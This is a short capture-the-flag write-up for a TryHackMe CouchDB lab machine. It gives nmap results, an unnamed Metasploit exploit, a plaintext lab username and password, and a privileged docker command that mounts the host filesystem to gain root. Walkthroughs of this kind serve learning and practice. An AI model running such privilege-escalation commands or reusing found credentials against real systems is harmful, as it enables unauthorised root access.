@@ -1,0 +1,21 @@
+CouchDB | tryhackme
+open ports 
+----------
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+5984/tcp open  http    CouchDB httpd 1.6.1 (Erlang OTP/18)
+
+found an explit in metasploit and we have a shell
+looking around and we get user.txt
+looking around the files gives us the credentials
+atena:t4qfzcc4qN##
+
+ssh into the machine with the credentials 
+
+and open the .bash_history and noticed
+docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
+
+running this will get us root
+
+root.txt in /mnt/root/root.txt
+
+
